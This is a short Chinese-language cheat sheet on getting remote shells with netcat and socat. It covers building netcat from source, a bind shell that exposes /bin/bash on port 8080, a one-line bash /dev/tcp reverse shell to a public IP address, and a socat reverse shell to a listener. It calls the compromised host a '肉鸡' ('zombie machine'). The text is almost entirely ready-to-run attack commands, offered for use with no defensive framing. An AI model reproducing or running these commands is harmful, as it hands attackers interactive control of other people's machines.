
# nc反弹

#### 安装原生版本的nc

```
wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz 
tar xf netcat-0.7.1.tar.gz 
cd netcat-0.7.1
# 执行编译需要gcc环境
./configure --prefix=/usr/local/ncat
make -j 2 && make install
ln -s /usr/local/ncat/bin/nc /usr/bin/nc
```

### 场景一：被攻击机和攻击机在同一个网络中时

- 被攻击机开启监听，并将bash发布出去

`nc -lvvp 8080 -t -e /bin/bash`

- 攻击机上直接连接目标主机的8080端口

`nc 192.168.31.41 8080`


### 场景二：被攻击机和攻击机在不同网络中时，比如被攻击机身处内网没有公网IP

- 攻击机上开启8080监听, 等待shell反弹

`nc -lvvp 8080`

- 被攻击机上使用一句话反弹shell

`bash -i >& /dev/tcp/211.149.240.203/8080 0>&1`

- 此时攻击机上已经接受到了shell，攻击机上执行ip add命令验证ip


# socat 反弹shell
    socket cat，基于socket，可以看做是ncat的加强版

#### socat命令下载链接，下载后直接放置/usr/local/bin目录即可使用
https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat 

### 肉鸡没有公网IP的情况 反弹shell

- 1、攻击机上开启监听

` socat TCP-LISTEN:5555 -`

- 2、被攻击机机上运行socat反弹shell(表示将shell反弹到192.168.1.101的12345端口)

`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.101:5555`

- 3、攻击机上已经获取到shell，可以直接iP add等命令查看




